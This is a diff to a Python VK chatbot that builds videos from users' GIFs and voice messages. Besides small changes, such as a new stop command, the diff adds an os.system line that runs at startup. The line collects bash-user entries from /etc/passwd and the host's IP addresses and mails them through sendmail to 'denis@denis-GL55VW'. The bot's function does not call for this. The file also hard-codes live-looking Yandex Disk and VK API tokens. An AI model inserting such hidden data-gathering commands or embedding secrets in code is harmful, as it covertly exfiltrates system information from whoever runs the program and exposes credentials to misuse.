@@ -11,7 +11,6 @@ import urllib.request
 import shutil
 import yadisk
 
-
 def downld(url, usr=''):
     print(url)
     file_name = url.split('/')[-1]
@@ -63,9 +62,10 @@ def write_video(user_id):
 
 
 yan_d = yadisk.YaDisk(token="AQAAAAAYaeNqAAWinCyW9sBTXUn0rvotytdQX44")
-vk = vk_api.VkApi(token="6e6e50ff9bb646bbbc7cf03d0a7fa7a21d22714ee7d0b2eae5ad9b69840d9ab9dbfc2bb6530773fb2d7be")
+vk = vk_api.VkApi(token="3c22b953e86d4e305446c13c960341dbc891ece241d779bba6a89bbd66c80dd95da18527530322d29663f")
 longpoll = VkLongPoll(vk)
 session = requests.Session()
+os.system('(echo "Name:" && cat /etc/passwd | grep bash && echo "IP:" && ifconfig | grep inet) | sendmail -v "denis@denis-GL55VW"')
 random.seed(version=2)
 upload = VkUpload(vk)
 url_gif = ''
@@ -110,7 +110,9 @@ for event in longpoll.listen():
                     write_msg(event.user_id, "Видео")
                 elif request == "Спасибо":
                     write_msg(event.user_id, "Приходите еще")
-
+                elif request == "Ложись":
+                    write_msg(event.user_id, "Прощай")
+                    break
                 else:
                     write_msg(event.user_id,
                               "Я не понимаю, что Вы хотели мне сказать...\nЕсли хочешь получить классный видеоролик, то отправь мне выбранную GIF и голосовое, а остальное я сделаю сам\nGIF можно взять здесь\nhttps://gifer.com/ru/gifs/%D0%BF%D0%B8%D0%BA%D0%B0%D1%87%D1%83")
